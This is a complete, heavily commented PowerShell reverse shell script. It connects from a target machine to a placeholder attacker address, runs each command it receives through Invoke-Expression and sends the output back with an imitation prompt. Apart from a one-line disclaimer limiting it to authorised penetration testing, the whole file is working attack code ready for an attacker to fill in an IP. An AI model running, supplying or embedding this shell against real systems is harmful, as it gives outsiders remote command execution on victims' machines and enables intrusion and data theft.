<#
.SYNOPSIS
    Establishes a basic PowerShell reverse shell connection using direct byte stream manipulation.

.DESCRIPTION
    This script connects back to an attacker's listener, allowing remote command execution.
    It reads raw bytes from the network stream, decodes them as commands, executes them,
    and then encodes the output back into bytes to send over the stream.
    This variant uses a fixed-size byte buffer and ASCII encoding.

.PARAMETER AttackerIP
    The IP address of the attacker's machine where the Netcat listener is running.
    (Placeholder: "Attacker_ip")

.PARAMETER AttackerPort
    The port number on the attacker's machine that the Netcat listener is listening on.
    (Placeholder: 1357)

.NOTES
    Author: Perunchess
    Disclaimer: For educational and authorized penetration testing purposes only.
                Do not use on systems without explicit, written permission.
                This script is highly likely to be detected by Antivirus/EDR solutions due to its functionality.
#>

# --- Configuration ---
# Define the attacker's IP address and listening port.
# IMPORTANT: Replace "Attacker_ip" with your actual attacker IP and 1357 with your chosen port.
$AttackerIP = "Attacker_ip"
$AttackerPort = 1357

# --- Establish TCP Connection ---
try {
    # Create a new TCP client object to connect to the attacker.
    # This initiates the outbound connection from the target to the attacker.
    $client = New-Object System.Net.Sockets.TcpClient($AttackerIP, $AttackerPort)
    
    # Get the network stream from the established TCP connection.
    # This stream is used for sending and receiving raw data (bytes).
    $stream = $client.GetStream()
    
    # Create a byte array buffer to temporarily store incoming data from the attacker.
    # A size of 65535 bytes (64KB) is a common buffer size. Initialize all bytes to 0.
    [byte[]]$bytes = 0..65535 | %{0}
    
    # Create an ASCIIEncoding object to convert bytes received from the attacker into readable strings.
    $encoding = New-Object System.Text.ASCIIEncoding
    
    # --- Interactive Shell Loop ---
    # This loop continuously reads commands from the attacker, executes them, and sends back the output.
    # The loop continues as long as data is being read from the stream ($i -ne 0).
    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        # Decode the incoming bytes from the attacker into a string command.
        # $data will contain the command sent by the attacker (e.g., "whoami", "dir").
        $data = $encoding.GetString($bytes, 0, $i)
        
        # Execute the received command using Invoke-Expression (iex).
        # 2>&1 redirects standard error (stream 2) to standard output (stream 1),
        # ensuring both command output and errors are captured.
        # Out-String converts the entire output into a single string.
        $sendback = (iex $data 2>&1 | Out-String)
        
        # Append the current PowerShell path prompt to the output.
        # This makes the shell look more like a regular PowerShell console to the attacker.
        $sendback2 = $sendback + "PS " + (pwd).Path + "> "
        
        # Encode the combined output (command result + prompt) back into bytes.
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        
        # Send the encoded output bytes back to the attacker over the network stream.
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        
        # Flush the stream's buffer to ensure all data is immediately sent.
        $stream.Flush()
    }
}
catch {
    # Catch any errors that occur during connection establishment or within the loop.
    # This provides basic error handling, preventing the script from crashing silently.
    Write-Host "An error occurred during reverse shell execution: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    # --- Connection Cleanup ---
    # This block ensures that the client connection is properly closed, regardless of whether
    # the try block completed successfully or an error occurred.
    if ($client -ne $null) {
        $client.Close() # Close the TCP connection.
        Write-Host "Reverse shell connection closed." -ForegroundColor Red
    }
}
